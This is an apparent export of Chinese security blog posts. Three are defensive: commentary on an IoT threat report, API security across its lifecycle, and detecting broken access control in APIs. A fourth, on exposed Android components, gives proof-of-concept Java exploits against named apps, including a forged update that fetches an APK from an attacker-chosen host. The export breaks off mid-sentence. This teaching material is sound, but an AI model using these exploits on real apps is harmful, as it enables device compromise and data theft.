[{"title":"2020 IoT Threat Report 解读","url":"/2020%20IoT%20Threat%20Report%20%E8%A7%A3%E8%AF%BB/","content":"今天看到PALO ALTO和Unit 42联合发布了这个不到20页的报告，读了一下，虽然篇幅稍短，但是内容还是很有价值的，结合笔者去年在做的事情，浅薄的解读下，有兴趣的可以阅读原文\n0x01 概要报告主要分为现阶段的IoT安全格局、Top IoT Threats、结论建议三个部分。\n第一部分主要讲现阶段IoT的安全格局，现在企业缺乏完善的IoT资产管理，缺少相应的安全产品去保护IoT设备，人力资源缺乏，整体风险很高，其中健康医疗行业风险特别高；\n第二部分重点讲了现阶段IoT的网络攻击、密码攻击、蠕虫等Top 威胁，同时还提到了因为没打补丁的设备以及老协议，导致攻击的横向移动，越来越多的威胁演化为专门针对IoT的场景；\n第三部分主要是讲如何解决这些威胁，4个步骤和2个最佳实践，下文会细讲。\n0x02 IoT Security LandscapeIoT是快速发展的，同时存在着很大的安全问题（数据支撑这里就不详细列了，例如2019比2018增长了21.5%的IoT设备数量、98%的IoT传输没有加密等）。\n1、企业缺少工具去识别资产和保护IoT设备\n\nIT 无法准确识别IoT资产\n\n报告中认为像传统IT依靠IP和OS来进行资产管理的方式对于IoT场景是不完善的。只有准确的识别出IoT设备的类型，才可以准确的进行网络规划、安全策略部署等，可以连续的跟踪IoT设备的行为，而不是仅仅根据一个动态的IP。\n笔者按：从笔者这一年的经历来看，这点说的非常贴切，IoT资产的管理和准入一直是个很大的痛点，通过IP来定位机器很容易丢掉，例如今天发现环境里某个IP的设备上有木马，然后去排查的时候，却发现因为DHCP随机分配IP的缘故，无法定位到问题设备了。当然这个例子有点极端，在泛IoT的场景下，mac地址也是一个非常核心的设备资产数据，但是也存在一些不足，因为泛IoT场景下设备的多样性，要准确的实现IoT设备资产管理需要多种方式的综合运用，例如流量、网络运维设备、人工排查等。\n\n现有的安全产品大多不支持IoT设备\n\nEDR等安全产品不支持IoT设备，PC上的安全产品会将IoT设备识别为未知类型，无法准确的识别风险和处置。基于网络的安全产品可以发现一部分风险，但是无法准确的识别、追踪IoT设备。\n笔者按：这里指的IoT设备和现在国内大多数场景下的泛IoT设备含义有点不同，和监控摄像头这类产品比较类似。面对IoT环境下的设备多样性，基于流量的威胁检测成了大多数厂商的共同选择，例如本报告的发布者平底锅，当然还有笔者也在做这方面的尝试。对于发现威胁后的准确识别追踪，就需要先将IoT设备资产进行准确的识别和有效的管理。\n\n在IT和OT之间，企业缺少足够的人力资源\n\nIT主要关注IT资产,例如电脑、网络、打印机等，OT(operational technology)主要关注非IT设备，也就是上文笔者提到的泛IoT设备。因为IT和OT往往团队不在一个，而且因为电脑等IT资产发展迅速，可以获得更多的资源。而IoT设备为了稳定性(和原文有点差别，这里来自笔者实际经历的解读)，漏洞往往没有人去主动修复，存在着很大的风险。\n2、企业现在面临着巨大的IoT安全风险\n公司内的IoT设备(摄像头、打印机等)因为缺少IT维护，存在着巨大的风险。\n\n3、医疗保健行业的状况是非常危急的\n  医疗设备运行着过时的操作系统\n  组织内缺少安全防御能力\n  医疗设备的操作系统是非常脆弱的\n\n4、最基本的网络隔离最佳实践没有遵守\n最简单的IoT风险补救措施就是网络细分，可以有效组织风险的横向移动。但是更多的情况下，网络划分时，没有严格细分，例如在医疗保健行业，将医疗设备和打印机等划分到一起。同时还提到了最理想的情况是进行微网络划分(在某些高危场景下确实应该这样)。\n0x03 Top IoT Threats针对IoT设备的威胁伴随着新的攻击技术在不断的演化，例如僵尸网络和蠕虫等\n1、网络攻击、密码攻击、IoT蠕虫威胁位居榜首\n\n\n利用目标设备的漏洞\n\n  IoT设备的特性特别容易成为被攻击的目标，它们往往成为攻击者入侵其它系统的跳板。\n\n密码攻击\n\n  笔者按：默认密码和弱密码是真的痛，无论是在应用上还是在IoT设备上。\n\nIoT蠕虫变得比IoT僵尸网络更常见\n\n  笔者按：随着这几年勒索病毒的兴起，针对泛IoT设备的攻击主要都变成了这个，当然挖矿木马也非常常见。利用IoT僵尸网络的DDOS由于了解的不深，这里就不班门弄斧了。\n2、没打补丁的设备、老旧的协议：横向移动的入口\n\n补丁覆盖率低\n\n  笔者按：IoT设备往往会因为版本迭代，逐渐放弃对老版本的更新支持，同时因为设备运行环境及稳定性需求，往往会放弃给设备打安全补丁。\n\n老旧的OT协议\n\n  这种情况更多的出现的工控环境下，随着网络边界的消失，这些老协议的风险正在暴露出来。\n\n横向移动\n\n  57%的IoT设备容易受到中等或高强度的攻击，使得IoT设备成为攻击者的进攻入口。\n3、许多威胁正在演化为专门针对IoT环境\n\nP2P通信的特点\n\n  使得攻击可以最小化的与外界通信来控制内网环境下的IoT设备集群。\n\n为host而战\n\n  病毒之间会互相干掉对方，争夺资源。\n\n病毒的变种\n\n  例如Mirai系列\n0x04 总结和建议1、4个步骤来降低IoT风险(虽然不全面，但是很大程度下降低了IoT的风险)\n  1、IoT设备资产发现；\n  2、打补丁；\n  3、细划分VLANs；\n\n  4、实时监控。\n\n  笔者吐槽：这几个步骤无理反驳，还是去买他家的盒子吧。吐槽归吐槽，这几个步骤对于现在大多数的泛IoT环境是非常有效的，但是如何做到是个难题，也是笔者去年和未来要努力去达到的。\n最佳实践1：整体思考IoT的生命周期\n\n\n1、识别：设备准入\n2、边界：NAC和Firewall结合（据笔者了解有些团队已经在做了）\n3、安全：基于流量的威胁发现（笔者正在做的事情）\n4、最优化：提高IoT设备的使用率\n5、管理：实时监控、报警\n6、回收：IoT设备的回收审计流程\n\n最佳实践2：通过产品集成将安全性扩展到所有的IoT设备\n安全产品集成包括以下：\n\n Asset management and computerized maintenance management systems (CMMS)\n Security information and event management (SIEM) \n Security orchestration, automation, and response (SOAR) \n Next-generation firewalls (NGFW) \n Network access control (NAC) \n Wireless/Network management solutions\n\n笔者总结\n~~ 这个报告虽然篇幅较短，但是不得不说平底锅的盒子贵有贵的道理，这篇报告的绝大部分都击中了现在IoT环境，特别是泛IoT环境所面临的安全威胁，整体解决思路和笔者正在做的大致相同。不过报告并没有说到具体如何落地，和绝大多数安全厂商一样，有点空中楼阁的感觉。但是经过笔者去年的验证，这两个落地实践的可行性是没有问题的，但是如何落地，长路漫漫，一点一点来了。~~\n报告地址：https://start.paloaltonetworks.com/unit-42-iot-threat-report?utm_source=marketo&amp;utm_medium=email&amp;utm_campaign=AMERICAS-DA-EN-20-03-10-7010g000001JJOZAA4-P3-Strata-Unit%2042%20IoT%20Report.Americas-DA-EN-20-03-10-XX-P3-Strata_IoT%20Report%20A/B\n","categories":["IoT安全"],"tags":["IoT"]},{"title":"API安全生命周期","url":"/API%E5%AE%89%E5%85%A8%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/","content":"写在前面本文的由来主要是最近一年来对内部API风险治理过程中的总结。因为API的种类繁多，并没有写的很详细，但是在其中表达了很多API治理的思路和经验总结。在WAF、黑白盒扫描器、RASP越来越成熟的今天，API导致的逻辑类风险将是各公司面临的最大难题，希望本文可以给予同行者们一些帮助。\n一、什么是API应用编程接口（API）由一组用于集成应用软件和服务的工具、定义和协议组合而成 https://www.redhat.com/zh/topics/api 。设计方式主要遵循SOAP协议或者REST架构。SOAP和REST的关系此处不在赘述，详情可以看https://www.redhat.com/zh/topics/integration/whats-the-difference-between-soap-resth。 \nAPI 既可以私有（仅供内部使用），也可以合用（与特定合作伙伴共享以创造更多收益）或公用（允许第三方开发的应用能与您的API 交互，从而推动创新）。\n在大多数情况下，企业会采用微服务架构，想要通过加速软件开发来满足需求。基于 HTTP 的 API 已成为微服务架构之间同步交互的首选方法。因为它们可以降低部署、可扩展性和维护的复杂性和开销。这些 API 是将所有微服务连接在一起的粘合剂。API被广泛的应用在各种业务中，也导致大量不规范的API发布到线上，将风险暴露在攻击者的视线中。\n二、API生命周期生命周期就是指一个对象的生老病死。其实所有的非瞬时性的对象都有着自己的生命周期，诞生-存在-消亡。\n￼\n那结合我们的实际经验，可以总结出API的生命周期，设计-开发-测试-上线-运行-迭代-下线。\n￼\n三、API安全生命周期1. API面临的主要网络攻击在聊API安全生命周期之前，首先我们要思考一下，API会遇到哪些攻击。API作为业务的表达，承载着大量的数据和生产资料，主要的攻击主要包括以下几种：\n\n失陷的访问控制 “失陷的访问控制”也就是常说的“越权”，荣登OWASP 2021的Top 1。API的访问控制失效，攻击方可直接调用API进行增删改查操作，造成数据泄漏或者生产中断。在有一定安全水位的企业里，越权漏洞一定是高危漏洞种类的重要组成。\n\n数据泄漏(敏感数据暴露、加密失败)   数据泄漏风险可以说是现在企业面临的最高网络攻击风险了，主要的泄漏途径除了被入侵拖库，就是API的数据过度透出、访问控制缺陷导致被批量调用泄漏数据。随着现在大公司的网络边界安全水位越来越高，被入侵拖库的难度已经非常大了，但是不规范的API暴露的数据泄漏敞口仍然是非常之多。\n\nWeb网络攻击   针对API的Web网络攻击主要包括DDoS攻击、注入攻击等等。这类传统web攻击类型作为一类，它们的共同点就是可以通过一定的策略进行拦截。\n\n\n2. API生命周期中的安全上面讲的都是外部的网络攻击威胁，但产生这些风险的原因都是内因，我们顺着API生命周期来看每一个环节中缺少的安全部分以及难点。\n￼￼\n1. 设计阶段绝大部分开发同学都想开发出安全和可靠的API，但是在设计之初以及开发过程中，因为自身对风险的整体认知不足，往往很难做到完善可靠的安全设计。在设计阶段，产品、开发等会多次对焦需求和设计方案，但是往往安全的角色在这里是缺席的。\n理想情况下，如果每个API的设计阶段都有安全工程师参与其中对其进行威胁建模，那线上的API风险将会大大减少。但是我们都知道，在 安全:开发 = 1:1000 的现状下，人工覆盖每个API的威胁建模将永远是一个美好的想象。\n安全部分：\n将威胁建模加入到API设计阶段，给出可能发生的风险解决建议和方案。\n实施难点：\n安全工程师在公司中的人数往往比较少，难以人工覆盖。\n实现建议：\n建设自动化威胁建模能力，同时对业务进行分层。采用“重点业务人工评审”和“非重点业务自动化威胁建模”相结合的方式，可以有效的对核心高风险接口进行覆盖。在过去半年里，我们在公司内部落地了这个思路，效果非常明显。\n2. 开发阶段开发过程中，安全基本没有机会参与其中，能做的大概就是提供API安全开发规范、安全开发插件、安全辅助包等辅助性安全开发工具。是否使用，全看开发同学的安全意识以及开发项目的紧迫程度。\n再一个有用的则是白盒代码扫描，嵌入到CI/CD流程中，发布到测试环境时就进行扫描。但是白盒代码扫描的弊端也很明显，对于逻辑类的风险，目前尚未有很好的检测工具，API是否包含敏感数据也很难判断。\n安全部分：\n\nAPI安全开发规范、安全开发插件、安全辅助包\n嵌入到CI/CD流程中的白盒代码扫描工具\n\n实施难点：\n如何让开发人员将这些安全辅助工具用起来是个挑战，安全意识培养在于一点一滴的积累。\n实现建议：\n白盒代码扫描实现越权等逻辑类漏洞的检测，在我看来是未来最有可能有效解决逻辑类漏洞的方向之一。但是到现在尚未看到有准确率高、可大规模覆盖使用的产品出现。不过各个公司内部应该都在进行着类似的实现，期待。\n3. 测试阶段如果利用得当，测试阶段将是保证API安全上线的一个关键环节。无论是自动化测试流程还是人工测试，都会对API的业务逻辑实现、稳定性等进行策略，越重要的业务覆盖的越全面。如果在测试的CheckList中加入API相关的内容，则可以接入测试的能力发现API的安全问题。\n在这里有一个关键问题，那就是API安全漏洞是否属于bug，例如API的权限校验失效，是否应该算进未被发现的bug数量中。这个共识如果可以达成，那接下来就可以去讨论如何合作了，无论是嵌入到自动化测试平台或者人工测试的CheckList中。在笔者看来，这个共识并不是很难达成，当然这也要看生产关系是怎样的。\n安全部分：\n与测试团队达成共识，API安全漏洞等于BUG，在此基础上，结合已有的基础设施进行合作，与测试团队共同在上线前发现API的安全风险。\n实施难点：\n\n测试团队的工作往往也比较饱和，要想达成共识最好能从上到下进行\n测试团队人员的安全专业能力往往欠缺，需要安全团队给予安全能力培训或者提供安全工具辅助发现安全风险\n\n实现建议：\n主要还是三个要点：与测试团队达成共识、提供自动化的测试工具以及提高测试同学的安全专业能力。\n4. 上线阶段API发布上线阶段是最关键的环节之一。如果API的漏洞在设计、开发、测试环节中没有被发现，那这将是最后的机会去阻止漏洞产生了，一旦发布到线上，那就只能和攻击者赛跑了。\n到这个阶段，理论上传统Web漏洞应该已经都被黑白盒漏洞扫描工具发现出来了，如果还没有，那就很难发现了。但是API权限和API数据相关的漏洞在上线阶段是很容易被安全同学挖掘出来的，不过这里也存在一个人力分配的情况。根据笔者的经验，在这个阶段将有限的安全人力投入到高风险的资产中是最具性价比的。什么样的API是高风险的呢？涉及敏感信息的、涉及资金的、涉及核心基础设施操作的，等等，与设计阶段的评审一样，分层治理。\n安全部分：\n通过建设自动化发现高风险API能力，例如通过测试流量识别敏感数据API等，对高风险API进行人工安全上线评审，将高危API漏洞拦截在上线前。\n实施难点：\n主要的难点应该是如何发现高风险的“影子资产”API，在聚光灯的API资产，出现风险的概率往往比较低，但是那些不在我们视线中的API，往往因为没有经过安全评审，产生严重的漏洞。业务、应用越多，“影子资产”API也会越多，如果对API资产进行全面的覆盖、管理，是一个非常有意义且重要的题目。\n实现建议：\n可以先从流量、日志入手，找到测试环境的流量，通过其识别哪些资产属于高风险资产，“影子资产”API的发现也可以类似的方式持续发现。\n5. 运行阶段运行阶段，API风险往往已经暴露在互联网，随时可能被攻击利用。这个节点的重心要做两件事，API被攻击情况的监控以及API漏洞的持续巡检。\nAPI被攻击情况的监控：例如通过WAF监控阻断SQL注入请求、通过防爬拦截掉尝试利用API越权漏洞获取数据的请求、通过UEBA发现利用自身权限批量获取敏感数据的行为等等。主要的监控能力需要具备WAF拦截、DDoS防御、爬虫拦截、用户异常行为检测等。\n安全部分：\n通过流量安全监控平台对风险进行检测、阻断，同时结合完善的应急响应流程，对攻击事件进行处置。\n实施难点：\n\n数据窃取类流量和真实业务流量相似度较高，通过传统的规则策略发现难度较大\n内部人员利用API获取数据的检测难度大\n\n实现建议：\n购买或者自研各类监控平台，对高风险API进行重点监控，同时针对各种类型的API风险，制定完善可靠的应急SOP。\n6. 迭代阶段这个阶段可能是最令人头疼的了，即便是这个API上线时经过各种扫描、评审，确定没有安全风险了，后边随着业务需求变化发生改动，就很容易产生新的风险，特别是当开发人员认为前期已经做过非常多的安全检测后，不太可能再出问题时。\n安全部分：\n\n需要我们建设响应的API迭代发现能力，当API发生高风险迭代时，介入安全评审流程。\n\n实施难点：\n\n当API发生迭代后，API的名称和API的参数可能并不会发生变化，却在返回值中透出了敏感数据\n\n实现建议：\n\n监控API的返回值，当历史API的返回值中新增敏感数据时，介入安全评审\n监控代码仓库变更，当发现API方法代码发生变更时，介入安全评审\n监控历史API的名称、入参等，当发生变化时，介入安全评审\n\n7. 下线阶段大量的API在完成自己的使命后，没有被及时下线，不仅会浪费系统资源，还会变成潜在的线上风险。例如一个API存在越权漏洞，但是因为没有流量一直没有被发现，直到有一天被攻击者利用。\n安全部分：\n\n需要我们针对该下线未下线的API建立API生命周期流程管理，催动无流量API下线。\n\n实施难点：\n\n如何识别哪些API是应该下线的，部分API在特殊业务场景下，可能在一年中只会使用几次，这部分要单独维护\n\n实现建议：\n\n监控API的流量变化，对一段时间内无流量的API启动下线流程\n\n3. API中的关键设施1、API管理API资产管理平台是API中的关键设施，从上文的API安全生命周期中可以看到，在各个环节都要依赖该平台能力，简单总结大致需要这几点功能：\n\nAPI资产自动发现能力，能否覆盖影子资产是关键\nAPI流量监控能力，持续性的对API的总流量及异常流量等各类API数据进行记录\nAPI敏感数据识别能力，API会涉及哪些敏感数据\nAPI画像构建能力，调用方、调用量等等\n\nAPI网关在一定程度上也会承载API管理的角色，但是一个公司里，往往不会只有一个API网关，甚至是很多API并没有走API网关，所以从安全的角度，需要有一个all in one的API管理平台。\n2、API网关近几年微服务架构的兴起使得API 网关成为必要的关键设施，庞大的业务系统被拆分成许多粒度更小的微服务，进行独立部署和维护，这种模式带来了更多的跨系统交互，应用API 的规模也爆发增加，API网关已然成为了微服务架构的标配组件。\n一个典型的API网关往往承载了非常多的能力，例如路由、限流、版本控制、运行情况监控等，但是在这里只聊安全性。\n\nAPI网关在安全性中的角色主要是“身份验证”和“访问控制”。API网关的访问控制功能通常从身份验证机制开始，用来确定API调用实际来源。\n身份验证方式主要有：\n\nAPI密钥：例如签名等\n基础身份验证：账号、密码登录\nOAuth2.0、OpenID Connect 、SAML等\n\n访问控制主要涉及API的访问控制，哪些用户、调用方可以访问，这里需要和账号体系中的角色进行判断。\n3、API权限设计权限失效类的风险主要包括以下几类：\n\nAPI未授权访问\nAPI水平越权\nAPI垂直越权\n\n除了上边说的三类权限漏洞，结合业务场景，一般会将权限分为两类\n\nAPI功能性权限/菜单权限（用户有没有权限访问这个功能/菜单）\nAPI数据性权限（用户有没有权限访问其它用户的数据）\n\n大多数情况下，只要开发人员有安全意识，往往不会遗漏权限校验。但是往往因为业务紧急情况或者对于架构的错误理解，对权限做出一些错误的理解。当然，还有很多没有安全意识的开发人员，认为有了登录就万事大吉了，这种情况就只能加强安全意识培训了。\n","categories":["应用安全"],"tags":["THINK"]},{"title":"API越权风险检测方式浅谈","url":"/API%E8%B6%8A%E6%9D%83%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F%E6%B5%85%E8%B0%88/","content":"\n0x01 前言越权漏洞相较于SQLInject、XSS、SSRF等漏洞，最大的不同点在于该漏洞和权限的架构设计具有强相关性，而权限的架构设计又强依赖业务属性，这就导致了几乎每个系统的权限架构都各不相同，自动化检测的难度非常之大，误报率非常高；内部的检测准确率无法有效提升，越权漏洞数量就很难有效的下降\n关于越权漏洞的挖掘，从原理上来看并不复杂，甚至可以说是简单，最大的难点在于信息收集能力、细心程度、对业务的理解度，这个其实也没有什么好谈的\n关于批量/自动化越权检测的文章在网路上寥寥无几，开源的工具更是少的可怜（某些大佬手里有牛逼工具除外），今天想要说的是在甲方，特别是应用数量三位数、四位数以上的甲方，在面对大量API时的越权漏洞检测思路探讨\n0x02 越权风险类型越权漏洞的分类及定义在[1]这个笔记里说的已经很详细了，在这里就不赘述了\n\n未授权访问\n\n水平越权\n\n垂直越权\n\n\n除了上边说的三类权限漏洞，结合业务场景，一般会将权限分为两类\n\n功能性权限/菜单权限\n用户有没有权限访问这个功能/菜单\n\n\n数据性权限\n用户有没有权限访问其它用户的数据\n\n\n\n0x03 检测方式一个应用，可能只需要一两个小时就可以测试完成；十个应用，顶多也就一周；那一百个呢？一千个呢？\n每天又会有几百个应用产生迭代，新增的API呢？\n实际上一家几千人的互联网公司，负责应用安全的同学往往只有两到三个，API会有几千几万个\n所以这里我们从黑盒、白盒、自动化、半自动的思路来探讨一下越权漏洞的解法\nI.  黑盒+自动化主要分给两个关键部分\n\n流量采集\n服务器出口日志采集\n测试环境日志采集\n\n\n请求重放\n多个账号重放请求\n结果对比\n排除误报\n\n\n\n优点：在理想情况下，可以通过很少的人力去覆盖大量应用\n缺点：大量的误报，安全产品死于误报；线上真实流量重放效果最好，却容易造成故障\nII. 黑盒+半自动化这种方式一般会尝试和测试团队合作，在测试环境里进行，或者安全工程师进行单个系统测试时使用，像ZTO的authcheck、BurpSuit插件AuthMatrix等差不多都是类似的思路\n\n流量采集\n浏览器被动代理或爬虫方式采集\n\n\n请求重放\n多个账号重放请求\n对response进行简化\n\n\n人工确认\n对简化后的response进行判断是否存在漏洞\n\n\n\n优点：最后输出的漏洞结果准确度较高，适合针对单一系统进行安全测试\n缺点：在面对大量应用及大量迭代新增API时，效率太低\nIII. 白盒+自动化这种方式有两种思路，一种是发现存在越权风险的接口，一种是发现不存在越权风险的接口，原理是差不多的\n\n白盒扫描\n入参是否包含可越权(可遍历)的参数\n是否有从cookie或session中或获取用户标识\n\n\n风险确认\n是否包含authcheck(xxid, userid)的判断逻辑\n是否包含@authcheck的注解\n\n\n\n优点：仿佛看到了可以批量发现越权风险的方法，对于一些简单的水平越权可以有效发现，而且一般一个系统的权限缺陷都是相似的，发现一个，发现一片\n缺点：误报率太高，不能发现复杂的越权风险\nIV. 白盒+半自动化这种思路和上面提到的”黑盒+半自动化“的思路差不多\n\n白盒扫描\n扫描器应用的API list（可参考我上一篇文章[2]）\n标明入参及用户标识、判断逻辑\n\n\n人工确认\n通过白盒扫描出来的入参、用户标识、判断逻辑来判断是否存在越权风险\n\n\n\n优点：对一部分水平越权、未授权访问的风险可以有效发现\n缺点：API数量一多就不灵光了，很难发现复杂的越权\n0x04 简单思考上边扯了这么一堆越权漏洞的检测方法，但其实并没有解决上边提出的问题\n上千个应用、几万个接口，每天新增上百个，如何去解？存量呢？新增呢？\n在以前，我还经常会去给开发们做一些安全培训，但是效果呢？只有少数开发能真正认识到越权的严重性，效果并不乐观，该出现的漏洞一个都没少，并且效果无法衡量\n做应用安全也有几年的时间了，现在所谓的”安全运营”也越来越多人提了，那我们是运营吗？是也不是，我更喜欢称自己为“技术运营”，用技术来解决运营的困境，这个愿望是好的，扯皮的事情总是少不了的\n回到越权漏洞的问题，每次做安全众测，都会爆出来一堆越权的问题，不乏之前出现类似漏洞的应用，然后就会有人跳出来问，你们之前复盘的action落实了吗？为什么还会出现？balabala，这些问题我又何尝不是经常问自己，到底是为什么？这段时间和教父也经常在讨论这些问题，那么问题出在哪里了呢？\n先说一下我的思考结论，越权漏洞的解法是”流程+工具(监控)+覆盖度+蛮力“\n\n流程\n举个例子，当SRC上报了一个越权漏洞过来，开发完成修复，然后进行复盘(出现这个问题的根本原因是什么？其它API会存在吗)，开发领了排查同类API的action回去，排查完成后，安全工程师核查开发同学的排查结果，形成闭环\n\n\n工具(监控)\n工具这个范围就很广了，在我看来，无论是开源的还是自己开发的工具都像是一块块积木，将它们通过合适的方式组合起来，才能发挥出最大的效果；而不是为了kpi而不停的造轮子，造完一个来年再造一个\n针对增量的API，建立完善的监控体系\n\n\n覆盖度\n这个点是最关键的一个点，你会发现，每次出事的点都是你没有覆盖到的，对资产的熟悉程度，对API的监控完整度都非常重要\n\n\n\n但这个也不是我真正想表达的点，因为按照上边的说法，还是要搞一套类SDL的东西出来，API那么多，人就这么两三个，到年底又变成PPT上代码了，第二年问题照旧\n虽说在这类风险的解决上没有一招鲜的讨论，但是我觉得真正需要去做的是逐个点打穿，一步步的去收敛风险；将一个个点打穿，才能真正的解决问题，而不是浮于表面，看起来大而全，实则只不过是徒有其表；没有流程、技术支撑的东西我是不信的，不要再提什么宣导啥的，没什么用处\n例如这个阶段就只做”复盘–开发自查–安全复查–安全挖掘漏洞–复盘”这个闭环，相信用不了半年，就可以对高危应用的风险进行有效收敛\n上边没有提“蛮力”这个点，有时候要解决风险，地毯式排查往往是最有效的方法；为什么这么说了，假设现在开始治理越权，那几千几万个存量API怎么处理呢，等扫描器开发完成？这时候可以对API进行分级，识别出其中包含敏感信息的API，这时候就剩几千个了(也是非常庞大的工作量，但是只能硬着头皮上)，对这部分API进行地毯式排查，没有敏感信息的越权，危害还是相对可控的；方式low了点，但效果是有的，同时建立完善的新增接口监控体系，对增量API及时的进行处理;在评审了大量的接口后，归纳总结，对每个业务域的权限架构进行优化(当然这非常困难)，安全接入进去，从根本解决问题（这种方案是笔者现在正在实践的，效果半年后再来写一篇）\n现实有时候是骨感的，干活的人没啥增加，每年的kpi都是不断的增长，很难专门拿出一段时间来做存量的攻坚，存量不解决，漏洞永不休\n//说了这么多，下班回家脑阔疼，不想调整逻辑了，大家将就着看一下，想表达的观点就一个“找到问题，打穿它，无论用什么方法，有些苦是一定要吃的”。\n//还有就是教父说招人一起来搞事情\n参考：\n[1]https://g.yuque.com/evilm/yuequan/gmqet8?language=en-us \n[2]https://mp.weixin.qq.com/s/ATpoEN9QI-D5vkxDimQ8FQ\n","categories":["应用安全"],"tags":["THINK"]},{"title":"Android组件暴露的安全性","url":"/Android%E7%BB%84%E4%BB%B6%E6%9A%B4%E9%9C%B2%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7/","content":"0x01 关于组件Android开发四大组件分别是：活动(Activity)：用于表现功能服务(Service)：后台运行服务，不提供界面呈现广播接收器(BroadcastReceiver)：用于接收广播内容提供商（ContentProvider）：支持在多个应用中存储和读取数据，相当于数据库外链:详细讲解\n在Android应用中，多一个组件暴露，就多一个攻击面。而攻击者就可以围绕这些攻击面进行测试，构造多种攻击手段。\n0x02 exported属性在AndroidManifest.xml文件中，四大组件都有android:exported属性，是个boolean值，可以为true或false这里有个值得注意的点默认值以有无intent-filter的action属性来决定，有则为true，没有则为false\n0x03 实例1、最常见的莫过于本地拒绝服务漏洞，四大组件都存在这个问题Android应用本地拒绝服务漏洞源于程序没有对Intent.getXXXExtra()获取的异常或者畸形数据处理时没有进行异常捕获，从而导致攻击者可通过向受害者应用发送此类空数据、异常或者畸形数据来达到使该应用crash的目的，简单的说就是攻击者通过intent发送空数据、异常或畸形数据给受害者应用，导致其崩溃\n例如导出的Broadcast Receiver组件可以被第三方APP任意调用，如果再没有对消息进行验证，就可能导致敏感信息泄露，并可能受到权限绕过、拒绝服务等攻击风险\ne.g. 某手机管家com.tencent.qqpimsecure.service.InOutCallReceiver广播组件没有对消息进行校验，传入空消息导致NullPointerException异常POC：\nIntent i = new Intent();ComponentName componetName = new ComponentName(  &quot;com.tencent.qqpimsecure&quot;,  &quot;com.tencent.qqpimsecure.service.InOutCallReceiver&quot;);         i.setComponent(componetName);       sendBroadcast(i);\n\n漏洞详情及解决方案\n2、绕过本地认证私有Activity不应被其他应用启动相对是安全的（只是相对的）公开暴露的Activity组件，可以被任意应用启动\ne.g. 某菊花网盘绕过本地密码非root的话直接启动其他activity即可绕过认证，本地认证只是简单topActivity\npublic void activityStart(View v) &#123;\t\tComponentName componetName = new ComponentName(&quot;com.huawei.dbank.v7&quot;,\t\t\t\t&quot;com.huawei.dbank.v7.ui.newbietask.NewbieTaskActivity&quot;);\t\ttry &#123;\t\t\tIntent intent = new Intent();\t\t\tintent.setComponent(componetName);\t\t\tstartActivity(intent);\t\t&#125; catch (Exception e) &#123;\t\t\tToast.makeText(getApplicationContext(), &quot;Not found&quot;, 0).show();\t\t&#125;\t&#125;\n\ne.g. 控制MIUI的手电筒开关（有趣的案例）MIUI内置的手电筒软件Stk.apk中，TorchService服务没有对广播来源进行验证，导致任何程序可以调用这个服务，打开或关闭手电筒\nIntent intent = new Intent();        intent.setAction(&quot;net.cactii.flash2.TOGGLE_FLASHLIGHT&quot;);        sendBroadcast(intent);\n\n3、伪造消息代码执行广播接收器没有对消息进行安全验证，通过发送恶意的消息，攻击者可以在用户手机通知栏上推送任意消息，点击消息后可以利用webview组件盗取本地隐私文件和执行任意代码\ne.g. 某搜索引擎云盘Intent i = new Intent();        i.setAction(&quot;com.baidu.android.pushservice.action.MESSAGE&quot;);        Bundle b = new Bundle();        try &#123;        \tJSONObject jsobject = new JSONObject();            JSONObject custom_content_js = new JSONObject();        \tjsobject.put(&quot;title&quot;, &quot;xxxxxxxxxxx&quot;);        \tjsobject.put(&quot;description&quot;, &quot;&quot;)        \tjsobject.put(&quot;url&quot;, &quot;http://drops.wooyun.org/webview.html&quot;);        \tJSONObject customcontent_js = new JSONObject();       \t        \tcustomcontent_js.put(&quot;type&quot;, &quot;1&quot;);        \tcustomcontent_js.put(&quot;msg_type&quot;, &quot;resources_push&quot;);        \tcustomcontent_js.put(&quot;uk&quot;, &quot;1&quot;);        \tcustomcontent_js.put(&quot;shareId&quot;, &quot;1&quot;);  \t        \tjsobject.put(&quot;custom_content&quot;, customcontent_js);   \t\t\tString cmd  = jsobject.toString();\t\t\tb.putByteArray(&quot;message&quot;, cmd.getBytes(&quot;UTF-8&quot;));\t\t&#125; catch (Exception e) &#123;\t\t\te.printStackTrace();\t\t&#125;\n\ne.g. 优酷Android 4.5客户端升级漏洞com.youku.service.push.StartActivityService组件从Intent从获取名为PushMsg的Serializable的数据，并根据其成员type来执行不同的流程，当type值为1时，执行App的升级操作。升级所需的相关数据如app的下载地址等也是从该序列化数据中获取。升级的具体流程在com.youku.ui.activity.UpdateActivity中，简单分析后发现升级过程未对下载地址等进行判断，因此可以任意指定该地址\nPOC\nPushMsg pushMsg = new PushMsg();pushMsg.type = 1;pushMsg.updateurl = &quot;http://**.**.**.**/data/wisegame/41839d1d510870f4/jiecaojingxuan_51.apk&quot;;pushMsg.updatecontent = &quot;This is Fake&quot;;Intent intent = new Intent();intent.setClassName(&quot;com.youku.phone&quot;,&quot;com.youku.service.push.StartActivityService&quot;);intent.putExtra(&quot;PushMsg&quot;, pushMsg);startService(intent);\n\n4、敏感信息泄漏e.g. 某应用隐式intent发送敏感信息缺陷代码\npublic class ServerService extends Service &#123;  private void d() &#123;    Intent v1 = new Intent();    v1.setAction(&quot;com.sample.action.server_running&quot;);    v1.putExtra(&quot;local_ip&quot;, v0.h);    v1.putExtra(&quot;port&quot;, v0.i);    v1.putExtra(&quot;code&quot;, v0.g);    v1.putExtra(&quot;connected&quot;, v0.s);    v1.putExtra(&quot;pwd_predefined&quot;, v0.r);    if (!TextUtils.isEmpty(v0.t)) &#123;      v1.putExtra(&quot;connected_usr&quot;, v0.t);    &#125;  &#125;  this.sendBroadcast(v1);&#125;\nPOC\npublic class BcReceiv extends BroadcastReceiver &#123;  @Override  public void onReceive(Context context, Intent intent)&#123;    String s = null;    if (intent.getAction().equals(&quot;com.sample.action.server_running&quot;))&#123;      String pwd = intent.getStringExtra(&quot;connected&quot;);      s = &quot;Airdroid  =&gt; [&quot; + pwd + &quot;]/&quot; + intent.getExtras();    &#125;    Toast.makeText(context, String.format(&quot;%s Received&quot;, s),                   Toast.LENGTH_SHORT).show();  &#125;&#125;\n5、提升权限e.g. 某系统清理工具暴露了com.cleanmaster.appwidget.WidgetService服务组件，当向此服务发送action为com.cleanmaster.appwidget.ACTION_FASTCLEAN的intent时，便可结束后台运行的一些app进程\n6、Content Provider 暴露泄露敏感信息Content Provider 